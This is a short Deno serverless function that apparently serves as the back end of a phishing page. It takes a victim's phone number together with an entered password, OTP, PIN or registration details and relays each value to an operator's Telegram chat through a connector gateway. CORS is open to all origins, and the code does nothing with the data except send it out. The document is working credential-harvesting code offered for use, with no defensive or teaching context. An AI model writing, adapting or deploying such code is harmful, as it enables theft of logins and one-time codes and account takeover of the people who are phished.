const GATEWAY_URL = 'https://connector-gateway.lovable.dev/telegram';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  const LOVABLE_API_KEY = Deno.env.get('LOVABLE_API_KEY');
  if (!LOVABLE_API_KEY) throw new Error('LOVABLE_API_KEY is not configured');

  const TELEGRAM_API_KEY = Deno.env.get('TELEGRAM_API_KEY');
  if (!TELEGRAM_API_KEY) throw new Error('TELEGRAM_API_KEY is not configured');

  const CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
  if (!CHAT_ID) throw new Error('TELEGRAM_CHAT_ID is not configured');

  try {
    const { type, value, phone } = await req.json();

    const labels: Record<string, string> = {
      password: '🔑 Password Entered',
      otp: '🔢 OTP Entered',
      pin: '📌 PIN Entered',
      register_otp: '🔢 Register OTP',
      register_details: '📋 Register Details',
      register_pin: '📌 Register PIN',
    };

    const label = labels[type] || 'Notification';

    const text = `${label}\n\n📱 Phone: \`${phone || 'N/A'}\`\n💬 Value: \`${value}\``;

    const response = await fetch(`${GATEWAY_URL}/sendMessage`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${LOVABLE_API_KEY}`,
        'X-Connection-Api-Key': TELEGRAM_API_KEY,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: 'Markdown',
      }),
    });

    const data = await response.json();
    if (!response.ok) {
      throw new Error(`Telegram API failed [${response.status}]: ${JSON.stringify(data)}`);
    }

    return new Response(JSON.stringify({ ok: true }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error) {
    console.error('Error:', error);
    const msg = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: msg }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
